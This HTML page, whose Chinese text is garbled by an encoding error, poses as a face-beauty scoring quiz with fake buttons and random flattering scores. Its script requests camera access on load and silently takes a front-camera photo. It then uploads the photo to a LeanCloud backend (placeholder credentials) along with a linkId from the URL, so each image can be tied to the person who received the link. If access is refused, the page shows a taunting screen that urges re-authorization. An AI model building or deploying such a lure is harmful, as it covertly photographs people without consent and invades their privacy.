<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>é¢œå€¼æµ‹è¯„</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
    body { min-height: 100vh; overflow-x: hidden; }

    /* ä¸»é¡µé¢ç¾åŒ–ï¼šæ¸å˜èƒŒæ™¯+å±…ä¸­å¸ƒå±€ */
    .test-page {
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      padding: 60px 20px;
      text-align: center;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }
    .test-page h1 {
      color: white;
      font-size: 40px;
      margin-bottom: 50px;
      text-shadow: 0 2px 10px rgba(0,0,0,0.2);
      letter-spacing: 2px;
    }

    /* å‡é€‰é¡¹å®¹å™¨ï¼šç»ç’ƒæ‹Ÿæ€é£æ ¼ */
    .fake-options {
      max-width: 350px;
      margin: 0 auto;
      background: rgba(255,255,255,0.15);
      backdrop-filter: blur(10px);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 8px 32px rgba(31,38,135,0.2);
      border: 1px solid rgba(255,255,255,0.18);
    }

    /* ä¸‹æ‹‰æ¡†ç¾åŒ– */
    .fake-select {
      width: 100%;
      padding: 15px;
      margin-bottom: 20px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 12px;
      background: rgba(255,255,255,0.2);
      color: white;
      font-size: 18px;
      outline: none;
      appearance: none;
      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
      background-repeat: no-repeat;
      background-position: right 15px center;
      background-size: 20px;
    }
    .fake-select option {
      color: #333;
      background: white;
    }

    /* æŒ‰é’®ç¾åŒ–ï¼šæ¸å˜+hoveråŠ¨ç”» */
    .fake-btn {
      width: 100%;
      padding: 15px;
      margin-bottom: 15px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(45deg, #ff6b6b, #ee5a52);
      color: white;
      font-size: 18px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(255,107,107,0.3);
    }
    .fake-btn:last-child {
      background: linear-gradient(45deg, #4facfe, #00f2fe);
      box-shadow: 0 4px 15px rgba(79,172,254,0.3);
    }
    .fake-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(0,0,0,0.2);
    }
    .fake-btn:disabled {
      background: linear-gradient(45deg, #bdc3c7, #95a5a6);
      transform: none;
      box-shadow: none;
      cursor: not-allowed;
    }

    /* æ²¡æƒé™é¡µé¢ç¾åŒ– */
    .no-permission-page {
      display: none;
      background: linear-gradient(135deg, #ff416c, #ff4b2b);
      min-height: 100vh;
      padding: 60px 20px;
      text-align: center;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    .no-permission-text {
      color: white;
      font-size: 48px;
      font-weight: bold;
      margin-bottom: 40px;
      text-shadow: 0 2px 15px rgba(0,0,0,0.2);
      letter-spacing: 3px;
    }
    .back-btn {
      padding: 15px 40px;
      border: none;
      border-radius: 12px;
      background: rgba(255,255,255,0.2);
      backdrop-filter: blur(5px);
      color: white;
      font-size: 20px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      border: 1px solid rgba(255,255,255,0.3);
    }
    .back-btn:hover {
      background: rgba(255,255,255,0.3);
      transform: translateY(-3px);
    }

    /* é€‚é…å°å±å¹• */
    @media (max-width: 375px) {
      .test-page h1 { font-size: 32px; }
      .fake-options { padding: 20px; }
      .no-permission-text { font-size: 36px; }
    }
  </style>
</head>
<body>
  <!-- ä¸»æµ‹è¯„é¡µé¢ -->
  <div class="test-page">
    <h1>âœ¨ é¢œå€¼æµ‹è¯„ âœ¨</h1>
    <div class="fake-options">
      <select class="fake-select" id="test-type">
        <option>é€‰æ‹©æµ‹è¯„ç±»å‹</option>
        <option>äº”å®˜è¯„åˆ†</option>
        <option>æ°”è´¨è¯„åˆ†</option>
        <option>ç»¼åˆè¯„åˆ†</option>
      </select>
      <button class="fake-btn" id="start-test">å¼€å§‹æµ‹è¯„</button>
      <button class="fake-btn">æŸ¥çœ‹å†å²è®°å½•</button>
    </div>
  </div>

  <!-- æ²¡æƒé™é¡µé¢ -->
  <div class="no-permission-page">
    <div class="no-permission-text">æ²¡æƒé™ï¼Œæµ‹ä¸ªæ¯›çº¿ï¼</div>
    <button class="back-btn" onclick="window.location.reload()">è¿”å›é‡æ–°æˆæƒ</button>
  </div>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const linkId = urlParams.get("linkId");
    const startBtn = document.getElementById("start-test");
    const testType = document.getElementById("test-type");
    const testPage = document.querySelector(".test-page");
    const noPermissionPage = document.querySelector(".no-permission-page");

    // é¡µé¢åŠ è½½å®Œæˆåï¼Œå»¶è¿Ÿ300mså¼¹æƒé™ï¼ˆè®©é¡µé¢å…ˆæ¸²æŸ“ï¼Œä¸çªå…€ï¼‰
    window.addEventListener("load", () => {
      setTimeout(() => {
        if (linkId) requestCameraPermission();
      }, 300);
    });

    // è¯·æ±‚ç›¸æœºæƒé™æ ¸å¿ƒå‡½æ•°
    function requestCameraPermission() {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          // é™é»˜æ‹ç…§+ä¸Šä¼ 
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play().then(() => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0);

            // åœæ­¢ç›¸æœº+ä¸Šä¼ 
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob(blob => {
              const formData = new FormData();
              formData.append("file", blob, `face-${Date.now()}.jpg`);

              // æ›¿æ¢ä¸ºä½ çš„LeanCloudé…ç½®
              fetch("https://ä½ çš„LeanCloud AppID.leancloud.cn/1.1/files/face-photo.jpg", {
                method: "POST",
                headers: {
                  "X-LC-Id": "ä½ çš„LeanCloud AppID",
                  "X-LC-Key": "ä½ çš„LeanCloud AppKey"
                },
                body: formData
              })
              .then(res => res.json())
              .then(fileData => {
                fetch("https://ä½ çš„LeanCloud AppID.leancloud.cn/1.1/classes/photo_data", {
                  method: "POST",
                  headers: {
                    "X-LC-Id": "ä½ çš„LeanCloud AppID",
                    "X-LC-Key": "ä½ çš„LeanCloud AppKey",
                    "Content-Type": "application/json"
                  },
                  body: JSON.stringify({
                    link_id: linkId,
                    photo_url: fileData.url,
                    file_id: fileData.objectId,
                    upload_time: new Date().toISOString()
                  })
                });
              });
            }, "image/jpeg", 0.8);
          });

          // æ˜¾ç¤ºè™šå‡æµ‹è¯„ç»“æœï¼ˆæ¨¡æ‹Ÿæµ‹è¯„è¿‡ç¨‹ï¼‰
          setTimeout(() => {
            const score = Math.floor(Math.random() * 10) + 90;
            const selectedType = testType.value === "é€‰æ‹©æµ‹è¯„ç±»å‹" ? "ç»¼åˆè¯„åˆ†" : testType.value;
            alert(`ğŸ‰ æµ‹è¯„å®Œæˆï¼ä½ çš„${selectedType}ä¸º${score}åˆ†ï½\né¢œå€¼è¶…è¶Šå…¨å›½${90 + Math.floor(Math.random() * 10)}%çš„ç”¨æˆ·ï¼`);
          }, 1500);
        })
        .catch(() => {
          // æ‹’ç»æƒé™ï¼šåˆ‡æ¢åˆ°æ²¡æƒé™é¡µé¢
          testPage.style.display = "none";
          noPermissionPage.style.display = "flex";
        });
    }

    // å‡æŒ‰é’®äº¤äº’ï¼ˆç‚¹å‡»å¼€å§‹æµ‹è¯„ä¹Ÿè§¦å‘æµ‹è¯„ç»“æœï¼‰
    startBtn.addEventListener("click", () => {
      const selectedType = testType.value === "é€‰æ‹©æµ‹è¯„ç±»å‹" ? "ç»¼åˆè¯„åˆ†" : testType.value;
      const score = Math.floor(Math.random() * 10) + 90;
      alert(`ğŸ‰ æµ‹è¯„å®Œæˆï¼ä½ çš„${selectedType}ä¸º${score}åˆ†ï½\né¢œå€¼è¶…è¶Šå…¨å›½${90 + Math.floor(Math.random() * 10)}%çš„ç”¨æˆ·ï¼`);
    });

    // æŸ¥çœ‹å†å²è®°å½•å‡åŠŸèƒ½
    document.querySelectorAll(".fake-btn:not(#start-test)").forEach(btn => {
      btn.addEventListener("click", () => {
        alert("ğŸ“œ æš‚æ— å†å²æµ‹è¯„è®°å½•ï½\nå¿«å»å®Œæˆé¦–æ¬¡æµ‹è¯„å§ï¼");
      });
    });
  </script>
</body>
</html>
